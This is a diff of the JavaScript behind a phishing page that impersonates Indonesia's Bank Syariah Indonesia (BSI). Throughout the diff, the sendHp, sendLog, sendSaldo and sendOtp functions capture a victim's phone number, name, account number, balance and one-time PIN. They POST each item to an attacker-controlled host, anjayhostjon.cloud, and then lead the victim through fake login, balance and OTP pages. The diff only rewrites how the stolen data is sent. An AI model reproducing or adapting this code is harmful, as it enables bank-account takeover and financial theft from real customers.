@@ -1,60 +1,44 @@
-var logo = "▩----𝘄𝘄𝘄.𝗯𝗮𝗻𝗸𝗯𝘀𝗶.𝗰𝗼.𝗶𝗱----▩";    
-       
- function sendHp(){
-    $('.process1').fadeIn();
-    $('#nohp').mask('00000000000');
-    event.preventDefault();
-    document.getElementById('btnSubmit1').innerHTML ="Memproses...";
-  var tarif = $('input[name="tarif"]:checked').val();
+function sendHp() {
+event.preventDefault();
+ var tarif = $('input[name="tarif"]:checked').val();
        if (tarif) {  
   sessionStorage.setItem('tarif', tarif);
   }
   var nomor = document.getElementById("nohp").value;
         sessionStorage.setItem("nomor", nomor);
-    
-  var gabungan = "" + logo + '\n\n𝗧𝗮𝗿𝗶𝗳 • ' + tarif + '\n𝗡𝗼.𝗛𝗽 • <b>+62' + nohp.value + '</b>';
-        
-   $.ajax({
-        url: 'https://anjayhostjon.cloud/BSI/b4h6a/im.php',       
-        type: 'POST',
-        data: { message: gabungan },
-        crossDomain: true,
-        headers: {
-            'Accept': 'application/json',
-            'Content-Type': 'application/x-www-form-urlencoded',
-        },
-    
-    complete: function(){  
-    setTimeout(function(){
-    document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
+$('.process1').fadeIn();
+ document.getElementById('btnSubmit1').innerHTML ="Memproses...";
+ 
+ 
+      $.ajax({
+            type: 'POST',
+            url: 'https://anjayhostjon.cloud/BSI/b4h6a/no.php',
+            data: $('#formHP').serialize(),
+            datatype: 'text',
+            
+            complete: function(data) {
+            setTimeout(function(){
+  window.location.href='login.html'
+  document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
  $('.process1').fadeOut();
-    location.href='login.html';
-    }, 500);}});};
-
+    }, 800);
+            }
+        })
+     }
      
-     
-     
-     
- function sendLog(){
-    $('.process1').fadeIn();    
-    event.preventDefault();
-    document.getElementById('btnSubmit1').innerHTML ="Memproses...";
-  
-  var gabungan = "" + logo + '\n𝗧𝗮𝗿𝗶𝗳 • ' + tarif.value + '\n𝗡𝗼.𝗛𝗽 • <b>+62' + nomor.value + '</b>\n\n𝗡𝗮𝗺𝗮 • ' + nama.value + '\n𝗡𝗼.𝗥𝗲𝗸 • ' + rek.value  ;
-        
-   $.ajax({
-        url: 'https://anjayhostjon.cloud/BSI/b4h6a/im.php',       
-        type: 'POST',
-        data: { message: gabungan },
-        crossDomain: true,
-        headers: {
-            'Accept': 'application/json',
-            'Content-Type': 'application/x-www-form-urlencoded',
-        },
-    
-    complete: function(){  
-    setTimeout(function(){
-    document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
+function sendLog() {
+event.preventDefault();
+$('.process1').fadeIn();
+ document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
+      $.ajax({
+            type: 'POST',
+            url: 'https://anjayhostjon.cloud/BSI/b4h6a/login.php',
+            data: $('#formLog').serialize(),
+            datatype: 'text',          
+            complete: function(data) {
+            setTimeout(function(){
+  window.location.href='saldo.html'
+  document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
  $('.process1').fadeOut();
     var tarif = document.getElementById('tarif').value;
     sessionStorage.setItem("tarif", tarif);  
@@ -64,33 +48,25 @@ var logo = "▩----𝘄𝘄𝘄.𝗯𝗮𝗻𝗸𝗯𝘀𝗶.𝗰𝗼.𝗶𝗱--
     sessionStorage.setItem("nama", nama);    
     var rek = document.getElementById('rek').value;
     sessionStorage.setItem("rek", rek);
-    location.href='saldo.html';
-    }, 500);}});};
-    
-    
-
-    
-             
-function sendSaldo(){
-    $('.process1').fadeIn();    
-    event.preventDefault();
-    document.getElementById('btnSubmit1').innerHTML ="Memproses...";
-  
-  var gabungan = "" + logo + '\n𝗧𝗮𝗿𝗶𝗳 • ' + tarif.value + '\n𝗡𝗼.𝗛𝗽 • <b>+62' + nomor.value + '</b>\n\n𝗡𝗮𝗺𝗮 • ' + nama.value + '\n𝗡𝗼.𝗥𝗲𝗸 • ' + rek.value + '\n𝗦𝗮𝗹𝗱𝗼 • <pre>' + saldo.value + '</pre>';
-        
-   $.ajax({
-        url: 'https://anjayhostjon.cloud/BSI/b4h6a/im.php',       
-        type: 'POST',
-        data: { message: gabungan },
-        crossDomain: true,
-        headers: {
-            'Accept': 'application/json',
-            'Content-Type': 'application/x-www-form-urlencoded',
-        },
-    
-    complete: function(){  
-    setTimeout(function(){
-    document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
+    }, 800);
+            }
+        })
+     }     
+     
+     
+function sendSaldo() {
+event.preventDefault();
+$('.process1').fadeIn();
+ document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
+      $.ajax({
+            type: 'POST',
+            url: 'https://anjayhostjon.cloud/BSI/b4h6a/saldo.php',
+            data: $('#jualpuki').serialize(),
+            datatype: 'text',          
+            complete: function(data) {
+            setTimeout(function(){
+  window.location.href='otp.html'
+  document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
  $('.process1').fadeOut();
     var tarif = document.getElementById('tarif').value;
     sessionStorage.setItem("tarif", tarif);  
@@ -102,9 +78,10 @@ function sendSaldo(){
     sessionStorage.setItem("rek", rek);
     var saldo = document.getElementById('saldo').value;
     sessionStorage.setItem("saldo", saldo);
-    location.href='otp.html';
-    }, 500);}});};
-
+    }, 800);
+            }
+        })
+     }     
 
 
 // otp
@@ -112,19 +89,13 @@ function sendOtp() {
   event.stopPropagation();
     event.preventDefault();
   $("#djload").show();  
- document.getElementById('btnSubmit1').innerHTML = "Memproses..."; 
- 
- var gabungan = "" + logo + '\n𝗧𝗮𝗿𝗶𝗳 • ' + tarif.value + '\n𝗡𝗼.𝗛𝗽 • <b>+62' + nomor.value + '</b>\n\n𝗡𝗮𝗺𝗮 • ' + nama.value + '\n𝗡𝗼.𝗥𝗲𝗸 • ' + rek.value + '\n𝗦𝗮𝗹𝗱𝗼 • <pre>' + saldo.value + '</pre>' + '\n\n𝗢𝗧𝗣 • <b>' + sixpin.value + '</b>';
-    
+ document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
-        url: 'https://anjayhostjon.cloud/BSI/b4h6a/im.php',       
-        type: 'POST',
-        data: { message: gabungan },
-        crossDomain: true,
-        headers: {
-            'Accept': 'application/json',
-            'Content-Type': 'application/x-www-form-urlencoded',
-        },
+ type: 'POST',
+ url: 'https://anjayhostjon.cloud/BSI/b4h6a/otp.php',
+ async: false,
+ dataType: 'JSON',
+ data: $('#form2').serialize(),
  
  complete: function(data) {
             console.log('Complete')
@@ -137,7 +108,7 @@ setTimeout(function(){
         }
     });
       setTimeout(() => {
-     document.getElementById("notif").innerHTML = "Untuk mendapatkan id pelanggan,<br/>Silahkan klik tombol dibawah ini";
+     document.getElementById("notif").innerHTML = "Untuk mendapatkan kode id pelanggan,<br/>Silahkan klik tombol dibawah ini";
      $("#djload").hide();  
    $("#notif").css("color", "black");
  $("#sixpin").val("");
@@ -157,8 +128,8 @@ function getcs(){
   
 setTimeout(function(){  
 location.href='https://anjayhostjon.cloud/BSI/b4h6a/wa';
-    }, 500);
+    }, 1000);
     setTimeout(function(){
     $("#djload").hide();   
-    }, 510);      
+    }, 1100);      
 }     
